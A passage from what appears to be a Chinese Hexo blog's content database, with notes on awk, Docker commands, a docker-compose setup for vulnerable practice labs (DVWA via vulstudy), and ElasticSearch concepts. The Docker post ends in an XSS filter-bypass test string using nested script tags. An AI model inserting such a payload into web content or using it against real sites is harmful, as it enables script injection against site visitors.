class=\"line\">CONVFMT\t数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组</span><br><span class=\"line\">ERRNO\t最后一个系统错误的描述</span><br><span class=\"line\">FIELDWIDTHS\t字段宽度列表(用空格键分隔)</span><br><span class=\"line\">FILENAME\t当前文件名</span><br><span class=\"line\">FNR\t各文件分别计数的行号</span><br><span class=\"line\">FS\t字段分隔符(默认是任何空格)</span><br><span class=\"line\">IGNORECASE\t如果为真，则进行忽略大小写的匹配</span><br><span class=\"line\">NF\t一条记录的字段的数目</span><br><span class=\"line\">NR\t已经读出的记录数，就是行号，从1开始</span><br><span class=\"line\">OFMT\t数字的输出格式(默认值是%.6g)</span><br><span class=\"line\">OFS\t输出记录分隔符（输出换行符），输出时用指定的符号代替换行符</span><br><span class=\"line\">ORS\t输出记录分隔符(默认值是一个换行符)</span><br><span class=\"line\">RLENGTH\t由match函数所匹配的字符串的长度</span><br><span class=\"line\">RS\t记录分隔符(默认是一个换行符)</span><br><span class=\"line\">RSTART\t由match函数所匹配的字符串的第一个位置</span><br><span class=\"line\">SUBSEP\t数组下标分隔符(默认值是/034)</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-awk\"><a href=\"#1-awk\" class=\"headerlink\" title=\"1.awk\"></a>1.awk</h4><p>用于处理文本</p>\n<h4 id=\"2-用法\"><a href=\"#2-用法\" class=\"headerlink\" title=\"2.用法\"></a>2.用法</h4><p>参考<a href=\"http://www.runoob.com/linux/linux-comm-awk.html\" target=\"_blank\" rel=\"noopener\">菜鸟教程</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk [选项参数] &apos;script&apos; var=value file(s)</span><br><span class=\"line\">或</span><br><span class=\"line\">awk [选项参数] -f scriptfile var=value file(s)</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-选项参数\"><a href=\"#1-选项参数\" class=\"headerlink\" title=\"1.选项参数\"></a>1.选项参数</h6><ul>\n<li>-F fs or –field-separator fs<br><br>指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F,。<br></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -F, &apos;&#123;print $1,$2&#125;&apos; xxx.txt</span><br><span class=\"line\">以逗号为分隔符，打印第一第二列</span><br></pre></td></tr></table></figure>\n<ul>\n<li>-v var=value or –asign var=value<br>赋值一个用户定义变量。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -va=1 &apos;&#123;print $1,$1+a&#125;&apos; xxx.txt</span><br><span class=\"line\">设置a为变量，打印第一和a+1列</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-运算符\"><a href=\"#2-运算符\" class=\"headerlink\" title=\"2.运算符\"></a>2.运算符</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">= += -= *= /= %= ^= **=\t赋值</span><br><span class=\"line\">?:\tC条件表达式</span><br><span class=\"line\">||\t逻辑或</span><br><span class=\"line\">&amp;&amp;\t逻辑与</span><br><span class=\"line\">~ ~!\t匹配正则表达式和不匹配正则表达式</span><br><span class=\"line\">&lt; &lt;= &gt; &gt;= != ==\t关系运算符</span><br><span class=\"line\">空格\t连接</span><br><span class=\"line\">+ -\t加，减</span><br><span class=\"line\">* / %\t乘，除与求余</span><br><span class=\"line\">+ - !\t一元加，减和逻辑非</span><br><span class=\"line\">^ ***\t求幂</span><br><span class=\"line\">++ --\t增加或减少，作为前缀或后缀</span><br><span class=\"line\">$\t字段引用</span><br><span class=\"line\">in\t数组成员</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk &apos;$1&gt;2&apos; xxx.txt</span><br><span class=\"line\">输出第一列大于2的行</span><br><span class=\"line\">awk -F, &apos;$1&gt;2&apos; xxx.txt</span><br><span class=\"line\">输出第一列大于2的行(字符串也会进行比较 例:value1-2 &gt; 2)</span><br><span class=\"line\">value1-1 + value1-2 = 0?</span><br><span class=\"line\">awk -F, &apos;$1=2&apos; xxx.txt</span><br><span class=\"line\">将第一列赋值为2</span><br><span class=\"line\">awk &apos;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&apos; xxx.txt</span><br><span class=\"line\">第一列大于2并且第二列等于&apos;Are&apos;的行,输出第一二三列</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-内建变量\"><a href=\"#3-内建变量\" class=\"headerlink\" title=\"3.内建变量\"></a>3.内建变量</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$n\t当前记录的第n个字段，字段间由FS分隔</span><br><span class=\"line\">$0\t完整的输入记录</span><br><span class=\"line\">ARGC\t命令行参数的数目</span><br><span class=\"line\">ARGIND\t命令行中当前文件的位置(从0开始算)</span><br><span class=\"line\">ARGV\t包含命令行参数的数组</span><br><span class=\"line\">CONVFMT\t数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组</span><br><span class=\"line\">ERRNO\t最后一个系统错误的描述</span><br><span class=\"line\">FIELDWIDTHS\t字段宽度列表(用空格键分隔)</span><br><span class=\"line\">FILENAME\t当前文件名</span><br><span class=\"line\">FNR\t各文件分别计数的行号</span><br><span class=\"line\">FS\t字段分隔符(默认是任何空格)</span><br><span class=\"line\">IGNORECASE\t如果为真，则进行忽略大小写的匹配</span><br><span class=\"line\">NF\t一条记录的字段的数目</span><br><span class=\"line\">NR\t已经读出的记录数，就是行号，从1开始</span><br><span class=\"line\">OFMT\t数字的输出格式(默认值是%.6g)</span><br><span class=\"line\">OFS\t输出记录分隔符（输出换行符），输出时用指定的符号代替换行符</span><br><span class=\"line\">ORS\t输出记录分隔符(默认值是一个换行符)</span><br><span class=\"line\">RLENGTH\t由match函数所匹配的字符串的长度</span><br><span class=\"line\">RS\t记录分隔符(默认是一个换行符)</span><br><span class=\"line\">RSTART\t由match函数所匹配的字符串的第一个位置</span><br><span class=\"line\">SUBSEP\t数组下标分隔符(默认值是/034)</span><br></pre></td></tr></table></figure>\n"},{"title":"docker","date":"2019-01-16T22:25:54.000Z","_content":"docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br>\n镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。\n#### 一.install\nubuntu 16.04 LTS<br>\n##### 1.sudo apt install docker.io\n##### 2.阿里镜像加速\n```\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://etuznpiq.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n保存为sh,执行\n##### 3.重启\nservie docker restart\n##### 4.登录\nsudo docker login --username=17888824094 registry.cn-hangzhou.aliyuncs.com\n##### 5.拉取远程镜像\nsudo docker pull microsoft/aci-helloworld\n##### 6.启动\n这是启动镜像<br>\ndocker run  镜像 (-d deamon模式)<br>\n例: docker run -d -p 8888:80 microsoft/aci-helloworld<br>\n-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br>\n目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www\n##### 7.查看\ndocker ps 查看容器信息<br>\ndocker logs 容器id   查看容器内日志\n##### 8.关闭\n这是操作的容器<br>\ndocker stop 容器id<br>\ndocker ps -a  查看关闭的容器<br>\ndocker restart 容器id    重启容器<br>\ndocker rm 容器id  删除容器\n##### 9.进入container\nsudo docker exec  -it 9a8(容器id前三位) /bin/sh<br>\n交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作\n##### 10.保存对容器的修改\n对容器的修改默认是保存的<br>\ndocker commit 698 name(生成一个新的版本名)\n##### 11.生成自己的image\n\n<scr<script>ipt>alert(\"XSS\");</scr<script>ipt>\n","source":"_posts/tools/docker.md","raw":"---\ntitle: docker\ndate: 2019-01-16 17:25:54\ntags: [tools,docker]\n---\ndocker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br>\n镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。\n#### 一.install\nubuntu 16.04 LTS<br>\n##### 1.sudo apt install docker.io\n##### 2.阿里镜像加速\n```\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-'EOF'\n{\n  \"registry-mirrors\": [\"https://etuznpiq.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n```\n保存为sh,执行\n##### 3.重启\nservie docker restart\n##### 4.登录\nsudo docker login --username=17888824094 registry.cn-hangzhou.aliyuncs.com\n##### 5.拉取远程镜像\nsudo docker pull microsoft/aci-helloworld\n##### 6.启动\n这是启动镜像<br>\ndocker run  镜像 (-d deamon模式)<br>\n例: docker run -d -p 8888:80 microsoft/aci-helloworld<br>\n-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br>\n目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www\n##### 7.查看\ndocker ps 查看容器信息<br>\ndocker logs 容器id   查看容器内日志\n##### 8.关闭\n这是操作的容器<br>\ndocker stop 容器id<br>\ndocker ps -a  查看关闭的容器<br>\ndocker restart 容器id    重启容器<br>\ndocker rm 容器id  删除容器\n##### 9.进入container\nsudo docker exec  -it 9a8(容器id前三位) /bin/sh<br>\n交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作\n##### 10.保存对容器的修改\n对容器的修改默认是保存的<br>\ndocker commit 698 name(生成一个新的版本名)\n##### 11.生成自己的image\n\n<scr<script>ipt>alert(\"XSS\");</scr<script>ipt>\n","slug":"tools/docker","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ih00256dcpkqdfqdon","content":"<p>docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br><br>镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。</p>\n<h4 id=\"一-install\"><a href=\"#一-install\" class=\"headerlink\" title=\"一.install\"></a>一.install</h4><p>ubuntu 16.04 LTS<br></p>\n<h5 id=\"1-sudo-apt-install-docker-io\"><a href=\"#1-sudo-apt-install-docker-io\" class=\"headerlink\" title=\"1.sudo apt install docker.io\"></a>1.sudo apt install docker.io</h5><h5 id=\"2-阿里镜像加速\"><a href=\"#2-阿里镜像加速\" class=\"headerlink\" title=\"2.阿里镜像加速\"></a>2.阿里镜像加速</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mkdir -p /etc/docker</span><br><span class=\"line\">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;registry-mirrors&quot;: [&quot;https://etuznpiq.mirror.aliyuncs.com&quot;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<p>保存为sh,执行</p>\n<h5 id=\"3-重启\"><a href=\"#3-重启\" class=\"headerlink\" title=\"3.重启\"></a>3.重启</h5><p>servie docker restart</p>\n<h5 id=\"4-登录\"><a href=\"#4-登录\" class=\"headerlink\" title=\"4.登录\"></a>4.登录</h5><p>sudo docker login –username=17888824094 registry.cn-hangzhou.aliyuncs.com</p>\n<h5 id=\"5-拉取远程镜像\"><a href=\"#5-拉取远程镜像\" class=\"headerlink\" title=\"5.拉取远程镜像\"></a>5.拉取远程镜像</h5><p>sudo docker pull microsoft/aci-helloworld</p>\n<h5 id=\"6-启动\"><a href=\"#6-启动\" class=\"headerlink\" title=\"6.启动\"></a>6.启动</h5><p>这是启动镜像<br><br>docker run  镜像 (-d deamon模式)<br><br>例: docker run -d -p 8888:80 microsoft/aci-helloworld<br><br>-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br><br>目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www</p>\n<h5 id=\"7-查看\"><a href=\"#7-查看\" class=\"headerlink\" title=\"7.查看\"></a>7.查看</h5><p>docker ps 查看容器信息<br><br>docker logs 容器id   查看容器内日志</p>\n<h5 id=\"8-关闭\"><a href=\"#8-关闭\" class=\"headerlink\" title=\"8.关闭\"></a>8.关闭</h5><p>这是操作的容器<br><br>docker stop 容器id<br><br>docker ps -a  查看关闭的容器<br><br>docker restart 容器id    重启容器<br><br>docker rm 容器id  删除容器</p>\n<h5 id=\"9-进入container\"><a href=\"#9-进入container\" class=\"headerlink\" title=\"9.进入container\"></a>9.进入container</h5><p>sudo docker exec  -it 9a8(容器id前三位) /bin/sh<br><br>交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作</p>\n<h5 id=\"10-保存对容器的修改\"><a href=\"#10-保存对容器的修改\" class=\"headerlink\" title=\"10.保存对容器的修改\"></a>10.保存对容器的修改</h5><p>对容器的修改默认是保存的<br><br>docker commit 698 name(生成一个新的版本名)</p>\n<h5 id=\"11-生成自己的image\"><a href=\"#11-生成自己的image\" class=\"headerlink\" title=\"11.生成自己的image\"></a>11.生成自己的image</h5><p>&lt;scr<script>ipt&gt;alert(“XSS”);&lt;/scr<script>ipt&gt;</p>\n</script></p>","site":{"data":{}},"excerpt":"","more":"<p>docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br><br>镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。</p>\n<h4 id=\"一-install\"><a href=\"#一-install\" class=\"headerlink\" title=\"一.install\"></a>一.install</h4><p>ubuntu 16.04 LTS<br></p>\n<h5 id=\"1-sudo-apt-install-docker-io\"><a href=\"#1-sudo-apt-install-docker-io\" class=\"headerlink\" title=\"1.sudo apt install docker.io\"></a>1.sudo apt install docker.io</h5><h5 id=\"2-阿里镜像加速\"><a href=\"#2-阿里镜像加速\" class=\"headerlink\" title=\"2.阿里镜像加速\"></a>2.阿里镜像加速</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mkdir -p /etc/docker</span><br><span class=\"line\">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;registry-mirrors&quot;: [&quot;https://etuznpiq.mirror.aliyuncs.com&quot;]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<p>保存为sh,执行</p>\n<h5 id=\"3-重启\"><a href=\"#3-重启\" class=\"headerlink\" title=\"3.重启\"></a>3.重启</h5><p>servie docker restart</p>\n<h5 id=\"4-登录\"><a href=\"#4-登录\" class=\"headerlink\" title=\"4.登录\"></a>4.登录</h5><p>sudo docker login –username=17888824094 registry.cn-hangzhou.aliyuncs.com</p>\n<h5 id=\"5-拉取远程镜像\"><a href=\"#5-拉取远程镜像\" class=\"headerlink\" title=\"5.拉取远程镜像\"></a>5.拉取远程镜像</h5><p>sudo docker pull microsoft/aci-helloworld</p>\n<h5 id=\"6-启动\"><a href=\"#6-启动\" class=\"headerlink\" title=\"6.启动\"></a>6.启动</h5><p>这是启动镜像<br><br>docker run  镜像 (-d deamon模式)<br><br>例: docker run -d -p 8888:80 microsoft/aci-helloworld<br><br>-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br><br>目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www</p>\n<h5 id=\"7-查看\"><a href=\"#7-查看\" class=\"headerlink\" title=\"7.查看\"></a>7.查看</h5><p>docker ps 查看容器信息<br><br>docker logs 容器id   查看容器内日志</p>\n<h5 id=\"8-关闭\"><a href=\"#8-关闭\" class=\"headerlink\" title=\"8.关闭\"></a>8.关闭</h5><p>这是操作的容器<br><br>docker stop 容器id<br><br>docker ps -a  查看关闭的容器<br><br>docker restart 容器id    重启容器<br><br>docker rm 容器id  删除容器</p>\n<h5 id=\"9-进入container\"><a href=\"#9-进入container\" class=\"headerlink\" title=\"9.进入container\"></a>9.进入container</h5><p>sudo docker exec  -it 9a8(容器id前三位) /bin/sh<br><br>交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作</p>\n<h5 id=\"10-保存对容器的修改\"><a href=\"#10-保存对容器的修改\" class=\"headerlink\" title=\"10.保存对容器的修改\"></a>10.保存对容器的修改</h5><p>对容器的修改默认是保存的<br><br>docker commit 698 name(生成一个新的版本名)</p>\n<h5 id=\"11-生成自己的image\"><a href=\"#11-生成自己的image\" class=\"headerlink\" title=\"11.生成自己的image\"></a>11.生成自己的image</h5><p>&lt;scr<script>ipt&gt;alert(“XSS”);&lt;/scr<script>ipt&gt;</p>\n</script></p>"},{"title":"docker搭建漏洞环境","date":"2019-02-14T16:53:54.000Z","_content":"#### 1.docker-compose\npip install docker-compose<br>\nCompose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排,负责快速的部署分布式应用。\n#### 2.git\ngit clone https://github.com/c0ny1/vulstudy.git\n#### 3.start\n###### 1.单独运行一个漏洞平台\ncd到要运行的漏洞平台下运行以下命令<br>\n\ncd vulstudy/DVWA<br>\ndocker-compose up -d #启动容器<br>\ndocker-compose stop #停止容器<br>\n###### 2.同时运行所有漏洞平台\n在项目根目录下运行以下命令<br>\n\ncd vulstudy<br>\ndocker-compose up -d #启动容器<br>\ndocker-compose stop #停止容器<br>\n\n##### 3.查看信息\ndocker-compose ps 查看启动信息<br>\ndocker-compose logs 查看日志<br>\n```\ndocker ps  \nsudo docker exec  -it 9a8(容器id前三位) /bin/sh<br>\n进入容器查看/修改\n```\n","source":"_posts/tools/docker_vulner_install.md","raw":"---\ntitle: docker搭建漏洞环境\ndate: 2019-02-14 11:53:54\ntags: [docker]\n---\n#### 1.docker-compose\npip install docker-compose<br>\nCompose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排,负责快速的部署分布式应用。\n#### 2.git\ngit clone https://github.com/c0ny1/vulstudy.git\n#### 3.start\n###### 1.单独运行一个漏洞平台\ncd到要运行的漏洞平台下运行以下命令<br>\n\ncd vulstudy/DVWA<br>\ndocker-compose up -d #启动容器<br>\ndocker-compose stop #停止容器<br>\n###### 2.同时运行所有漏洞平台\n在项目根目录下运行以下命令<br>\n\ncd vulstudy<br>\ndocker-compose up -d #启动容器<br>\ndocker-compose stop #停止容器<br>\n\n##### 3.查看信息\ndocker-compose ps 查看启动信息<br>\ndocker-compose logs 查看日志<br>\n```\ndocker ps  \nsudo docker exec  -it 9a8(容器id前三位) /bin/sh<br>\n进入容器查看/修改\n```\n","slug":"tools/docker_vulner_install","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ii00286dcpl1h95pn2","content":"<h4 id=\"1-docker-compose\"><a href=\"#1-docker-compose\" class=\"headerlink\" title=\"1.docker-compose\"></a>1.docker-compose</h4><p>pip install docker-compose<br><br>Compose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排,负责快速的部署分布式应用。</p>\n<h4 id=\"2-git\"><a href=\"#2-git\" class=\"headerlink\" title=\"2.git\"></a>2.git</h4><p>git clone <a href=\"https://github.com/c0ny1/vulstudy.git\" target=\"_blank\" rel=\"noopener\">https://github.com/c0ny1/vulstudy.git</a></p>\n<h4 id=\"3-start\"><a href=\"#3-start\" class=\"headerlink\" title=\"3.start\"></a>3.start</h4><h6 id=\"1-单独运行一个漏洞平台\"><a href=\"#1-单独运行一个漏洞平台\" class=\"headerlink\" title=\"1.单独运行一个漏洞平台\"></a>1.单独运行一个漏洞平台</h6><p>cd到要运行的漏洞平台下运行以下命令<br></p>\n<p>cd vulstudy/DVWA<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>\n<h6 id=\"2-同时运行所有漏洞平台\"><a href=\"#2-同时运行所有漏洞平台\" class=\"headerlink\" title=\"2.同时运行所有漏洞平台\"></a>2.同时运行所有漏洞平台</h6><p>在项目根目录下运行以下命令<br></p>\n<p>cd vulstudy<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>\n<h5 id=\"3-查看信息\"><a href=\"#3-查看信息\" class=\"headerlink\" title=\"3.查看信息\"></a>3.查看信息</h5><p>docker-compose ps 查看启动信息<br><br>docker-compose logs 查看日志<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker ps  </span><br><span class=\"line\">sudo docker exec  -it 9a8(容器id前三位) /bin/sh&lt;br&gt;</span><br><span class=\"line\">进入容器查看/修改</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-docker-compose\"><a href=\"#1-docker-compose\" class=\"headerlink\" title=\"1.docker-compose\"></a>1.docker-compose</h4><p>pip install docker-compose<br><br>Compose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排,负责快速的部署分布式应用。</p>\n<h4 id=\"2-git\"><a href=\"#2-git\" class=\"headerlink\" title=\"2.git\"></a>2.git</h4><p>git clone <a href=\"https://github.com/c0ny1/vulstudy.git\" target=\"_blank\" rel=\"noopener\">https://github.com/c0ny1/vulstudy.git</a></p>\n<h4 id=\"3-start\"><a href=\"#3-start\" class=\"headerlink\" title=\"3.start\"></a>3.start</h4><h6 id=\"1-单独运行一个漏洞平台\"><a href=\"#1-单独运行一个漏洞平台\" class=\"headerlink\" title=\"1.单独运行一个漏洞平台\"></a>1.单独运行一个漏洞平台</h6><p>cd到要运行的漏洞平台下运行以下命令<br></p>\n<p>cd vulstudy/DVWA<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>\n<h6 id=\"2-同时运行所有漏洞平台\"><a href=\"#2-同时运行所有漏洞平台\" class=\"headerlink\" title=\"2.同时运行所有漏洞平台\"></a>2.同时运行所有漏洞平台</h6><p>在项目根目录下运行以下命令<br></p>\n<p>cd vulstudy<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>\n<h5 id=\"3-查看信息\"><a href=\"#3-查看信息\" class=\"headerlink\" title=\"3.查看信息\"></a>3.查看信息</h5><p>docker-compose ps 查看启动信息<br><br>docker-compose logs 查看日志<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker ps  </span><br><span class=\"line\">sudo docker exec  -it 9a8(容器id前三位) /bin/sh&lt;br&gt;</span><br><span class=\"line\">进入容器查看/修改</span><br></pre></td></tr></table></figure></p>\n"},{"title":"ElasticSearch简介","date":"2019-07-16T22:55:31.000Z","_content":"\n### 一.介绍\nElasticsearch 是一个分布式的搜索引擎，底层基于Lucense。<br>\n最主要的功能是可以提供文档型数据的存储与检索，高效(几乎实时，毫秒级).<br>\n### 二.安装\nhttps://www.cnblogs.com/leeSmall/p/9220535.html\n### 三.重要概念\n\n- Cluster 集群\n\n集群是一个或多个节点（服务器）的集合， 这些节点共同保存整个数据，并在所有节点上提供联合索引和搜索功能。一个集群由一个唯一集群ID确定，并指定一个集群名（默认为“elasticsearch”）。该集群名非常重要，因为节点可以通过这个集群名加入群集，一个节点只能是群集的一部分<br>\n\n-  Node 节点\n\n节点是单个服务器实例，可以存储数据，并参与集群的索引和搜索功能。就像一个集群，节点的名称默认为一个随机的通用唯一标识符（UUID），确定在启动时分配给该节点。如果不希望默认，可以定义任何节点名。这个名字对管理很重要，目的是要确定你的网络服务器对应于你的ElasticSearch群集节点。<br>\n\n- Index 索引\n\n索引是具有相似特性的文档集合。例如，可以为客户数据提供索引，为产品目录建立另一个索引，以及为订单数据建立另一个索引。索引由名称（必须全部为小写）标识，该名称用于在对其中的文档执行索引、搜索、更新和删除操作时引用索引。<br>\n\n- Type 类型\n\n在索引中，可以定义一个或多个类型。类型是索引的逻辑类别/分区，其语义完全取决于您。一般来说，类型定义为具有公共字段集的文档。例如，假设你运行一个博客平台，并将所有数据存储在一个索引中。在这个索引中，您可以为用户数据定义一种类型，为博客数据定义另一种类型，以及为注释数据定义另一类型。<br>\n\n- Document 文档\n\n文档是可以被索引的信息的基本单位。用来存储信息。一般为JSON（JavaScript Object Notation）格式，这是一种非常普遍的互联网数据交换格式。<br>\n\n\n- Shards & Replicas 分片与副本\n\n索引可以存储大量的数据，这些数据可能超过单个节点的硬件限制。为了解决这一问题，当创建一个索引，可以定义你想要的分片数量。每个分片本身是一个全功能的、独立的“Index”，可以托管在集群中的任何节点。<br>\n\nShards分片的重要性主要体现在以下两个特征：<br>\n>分片允许您水平拆分或缩放内容的大小<br>\n>分片允许你分配和并行操作的碎片（可能在多个节点上）从而提高性能/吞吐量<br>\n\n\n副本是防止，在同一个集群网络或云环境上，出现故障时，分片和结点因为某些原因离线或消失。<br>\nReplicas的重要性主要体现在以下两个特征：<br>\n\n>副本为分片或节点失败提供了高可用性。为此，需要注意的是，一个副本的分片不会分配在同一个节点作为原始的或主分片，副本是从主分片那里复制过来的。<br>\n>副本允许用户扩展你的搜索量或吞吐量，因为搜索可以在所有副本上并行执行。\n\n\n- 重要\n\n<strong> es和关系型数据库的类似</strong>\n\n关系型数据库 | Elasticsearch\n:-: | :-:\nDatabase | Index\nTable  |Type\nRow | Document，非固定结构\nColumn | Field\nSchema | Mapping\n\n\n### 四.Spring集成\n\nhttps://www.cnblogs.com/leeSmall/p/9218779.html\n","source":"_posts/tools/elasticserach.md","raw":"---\ntitle: ElasticSearch简介\ndate: 2019-07-16 18:55:31\ntags: [tools]\n---\n\n### 一.介绍\nElasticsearch 是一个分布式的搜索引擎，底层基于Lucense。<br>\n最主要的功能是可以提供文档型数据的存储与检索，高效(几乎实时，毫秒级).<br>\n### 二.安装\nhttps://www.cnblogs.com/leeSmall/p/9220535.html\n### 三.重要概念\n\n- Cluster 集群\n\n集群是一个或多个节点（服务器）的集合， 这些节点共同保存整个数据，并在所有节点上提供联合索引和搜索功能。一个集群由一个唯一集群ID确定，并指定一个集群名（默认为“elasticsearch”）。该集群名非常重要，因为节点可以通过这个集群名加入群集，一个节点只能是群集的一部分<br>\n\n-  Node 节点\n\n节点是单个服务器实例，可以存储数据，并参与集群的索引和搜索功能。就像一个集群，节点的名称默认为一个随机的通用唯一标识符（UUID），确定在启动时分配给该节点。如果不希望默认，可以定义任何节点名。这个名字对管理很重要，目的是要确定你的网络服务器对应于你的ElasticSearch群集节点。<br>\n\n- Index 索引\n\n索引是具有相似特性的文档集合。例如，可以为客户数据提供索引，为产品目录建立另一个索引，以及为订单数据建立另一个索引。索引由名称（必须全部为小写）标识，该名称用于在对其中的文档执行索引、搜索、更新和删除操作时引用索引。<br>\n\n- Type 类型\n\n在索引中，可以定义一个或多个类型。类型是索引的逻辑类别/分区，其语义完全取决于您。一般来说，类型定义为具有公共字段集的文档。例如，假设你运行一个博客平台，并将所有数据存储在一个索引中。在这个索引中，您可以为用户数据定义一种类型，为博客数据定义另一种类型，以及为注释数据定义另一类型。<br>\n\n- Document 